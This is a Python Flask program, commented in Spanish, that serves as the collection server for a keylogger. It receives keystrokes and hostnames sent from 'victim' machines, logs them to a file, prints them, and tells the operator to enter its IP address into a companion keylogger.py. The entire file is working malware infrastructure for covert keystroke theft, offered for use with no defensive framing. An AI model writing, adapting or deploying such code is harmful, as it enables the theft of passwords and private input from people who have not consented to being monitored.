from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def receive_log():
    """Recibe las teclas capturadas desde la máquina víctima"""
    data = request.get_json()
    
    if data:
        hostname = data.get('hostname', 'desconocido')
        keystrokes = data.get('keystrokes', '')
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Guardar en archivo
        with open("received_logs.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{hostname}] {keystrokes}\n")
        
        # Mostrar en pantalla
        print(f"[{timestamp}] [{hostname}] {keystrokes[:100]}")
        
        return jsonify({"status": "ok"}), 200
    
    return jsonify({"status": "error"}), 400

@app.route('/')
def home():
    return "Servidor receptor de keylogger funcionando."

if __name__ == "__main__":
    print("=" * 50)
    print("  SERVIDOR RECEPTOR DE KEYLOGGER")
    print("  Esperando conexiones...")
    print("=" * 50)
    print()
    
    # Obtener IP local
    import socket
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"  Tu IP es: {local_ip}")
    print(f"  Pon esto en keylogger.py -> SERVER_URL")
    print()
    
    app.run(host="0.0.0.0", port=5000, debug=False)